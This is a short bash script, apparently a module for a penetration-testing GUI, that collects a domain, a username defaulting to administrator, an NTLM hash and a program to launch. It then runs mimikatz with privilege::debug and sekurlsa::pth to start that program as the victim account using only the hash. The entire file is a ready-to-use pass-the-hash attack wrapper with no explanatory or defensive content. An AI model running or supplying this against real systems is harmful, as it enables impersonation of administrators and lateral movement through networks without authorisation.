#!/bin/bash

: '
Mimikatz: execute program with pass the hash
'


# Generate GUI form items (label, type (optional: default text), name, default (optional))
DOMAIN_FIELD=$(form_item  "domain" "domain")
USERNAME_FIELD=$(form_item  "username" "username" "administrator")
HASH_FIELD=$(form_item  "hash" "hash")
CMD_FIELD=$(form_item  "execute program" "execute_program" "cmd.exe")

# Generate GUI form
generate_form "${DOMAIN_FIELD}" "${USERNAME_FIELD}" "${HASH_FIELD}" "${CMD_FIELD}"

DOMAIN=${form_data["domain"]}
USERNAME=${form_data["username"]}
HASH=${form_data["hash"]}
CMD=${form_data["execute_program"]}

execute_command "mimikatz.exe privilege::debug \"sekurlsa::pth /user:${USERNAME} /rc4:${HASH} /domain:${DOMAIN} /run:${CMD}\" exit"
create_new_line
